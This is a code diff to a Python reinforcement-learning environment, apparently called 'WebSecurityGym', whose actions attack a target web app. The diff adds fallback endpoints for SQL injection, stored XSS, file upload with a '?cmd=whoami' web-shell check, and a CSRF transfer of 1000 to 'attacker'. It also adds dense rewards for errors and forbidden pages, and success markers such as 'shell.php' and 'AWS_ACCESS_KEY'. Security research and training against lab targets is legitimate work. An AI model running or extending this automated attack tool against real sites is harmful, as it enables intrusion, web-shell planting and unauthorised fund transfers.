@@ -598,7 +598,14 @@ class WebSecurityGym(gym.Env):
     def attack_sqli_classic(self) -> Tuple[requests.Response, float]:
         """Classic SQL Injection."""
         payload = self.payload_manager.get_sqli("simple")
+        
+        # Try generic
         r = self.session.get(f"{self.target_url}/search?q={payload}", timeout=3)
+        
+        # Try E-Commerce Search
+        if r.status_code == 404:
+            r = self.session.get(f"{self.target_url}/api/products?search={payload}", timeout=3)
+            
         return r, self._calculate_reward(r, "SQL_SEARCH")
     
     def attack_sqli_union(self) -> Tuple[requests.Response, float]:
@@ -652,9 +659,22 @@ class WebSecurityGym(gym.Env):
         if not self.auth_token:
             return None, -5.0
         payload = self.payload_manager.get_xss("simple")
+        
+        # Try generic API
         r = self.session.post(f"{self.target_url}/api/v1/interact/comment_x",
                              json={"payload": payload, "target_id": 1},
                              headers={"Authorization": f"Bearer {self.auth_token}"}, timeout=3)
+                             
+        # Try Blog App /post/1/comment
+        if r.status_code == 404:
+            r = self.session.post(f"{self.target_url}/post/1/comment",
+                                data={"content": payload}, timeout=3)
+                                
+        # Try Social Media /api/posts
+        if r.status_code == 404:
+            r = self.session.post(f"{self.target_url}/api/posts",
+                                json={"content": payload}, timeout=3)
+                                
         return r, self._calculate_reward(r, "XSS_STORED")
     
     def attack_xss_dom(self) -> Tuple[requests.Response, float]:
@@ -787,14 +807,13 @@ class WebSecurityGym(gym.Env):
         payload = self.payload_manager.get_file_upload()
         files = {'file': (payload['name'], payload['content'])}
         
-        # 1. Upload the file
+        # Try generic /upload
         r = self.session.post(f"{self.target_url}/upload", files=files, timeout=3)
         
-        # 2. Verify execution (if successful)
-        if r.status_code == 200 and 'path' in r.json():
-            uploaded_path = r.json()['path']
-            # Try to access the uploaded file
-            r_verify = self.session.get(f"{self.target_url}{uploaded_path}", timeout=3)
+        # Verify upload
+        if r.status_code == 200:
+            # Try to access the file
+            r_verify = self.session.get(f"{self.target_url}/uploads/{payload['name']}?cmd=whoami", timeout=3)
             
             # If we get the content back, it's a win
             if payload['content'] in r_verify.text:
@@ -899,6 +918,23 @@ class WebSecurityGym(gym.Env):
         if hasattr(self, 'business_context') and self.business_context == 1:
             multiplier += 1.0 # +100% for attacking business logic pages (Money/Admin)
             
+        # DENSE REWARDS: Small rewards for "getting closer"
+        # 1. Found a form?
+        if "<form" in response.text.lower():
+            reward += 1.0
+            
+        # 2. Found a URL parameter?
+        if "?" in response.url and "=" in response.url:
+            reward += 2.0
+            
+        # 3. Got a 500 Error (Potential Breakage)
+        if response.status_code == 500:
+            reward += 5.0
+            
+        # 4. Got a 403 Forbidden (Potential Sensitive Area)
+        if response.status_code == 403:
+            reward += 2.0
+            
         # 1. Penalty: Triggered the Firewall (WAF)
         if response.status_code == 403 and "WAF" in response.text:
             self.triggered_waf = 1
@@ -916,12 +952,12 @@ class WebSecurityGym(gym.Env):
             "XSS_API": ["payload_accepted", "check_the_logs", "<script>", "alert("],
             "XSS_REFLECTED": ["<script>alert(1)</script>", "onerror=alert(1)", "alert(1)"],
             "BAC_API": ["DB_LEAK_SUCCESS", "admin", "password", "users", "role", "balance"],
-            "IDOR": ["IDOR_MASTER", "ID: 1", "user_id", "order_id", "profile"],
+            "IDOR": ["IDOR_MASTER", "ID: 1", "user_id", "order_id", "profile", "User Details"],
             "SSRF": ["Internal Admin Panel", "AWS_ACCESS_KEY", "vuln': 'SSRF'", "SSH-2.0", "Compute Engine"],
             "FILE_UPLOAD": ["File uploaded successfully", "Unrestricted File Upload", "shell.php"],
             "MASS_ASSIGNMENT": ["credit_balance", "999999", "admin", "role"],
             "PROTOTYPE_POLLUTION": ["isAdmin", "true", "prototype"],
-            "CSRF": ["Transfer completed", "vuln': 'CSRF'", "Friend added"],
+            "CSRF": ["Transfer completed", "vuln': 'CSRF'", "Friend added", "Transfer successful"],
             "OPEN_REDIRECT": ["Example Domain", "google.com", "evil.com"],
             "COOKIE_INJECTION": ["admin=true", "role=administrator", "isAdmin=1", "privilege"],
             "COOKIE_POISONING": ["admin_session", "access_level", "user_role=admin"],
@@ -996,8 +1032,15 @@ class WebSecurityGym(gym.Env):
 
     def attack_csrf_transfer(self) -> Tuple[requests.Response, float]:
         """Action 31: CSRF to transfer funds/change state."""
+        # Try generic /transfer_money
         r = self.session.post(f"{self.target_url}/transfer_money", 
                              json={"to_user": "attacker", "amount": "1000"}, timeout=3)
+        
+        # Try Banking App specific /transfer
+        if r.status_code == 404:
+             r = self.session.post(f"{self.target_url}/transfer", 
+                             data={"recipient": "attacker", "amount": "1000"}, timeout=3)
+                             
         return r, self._calculate_reward(r, "CSRF")
 
     def attack_open_redirect(self) -> Tuple[requests.Response, float]:
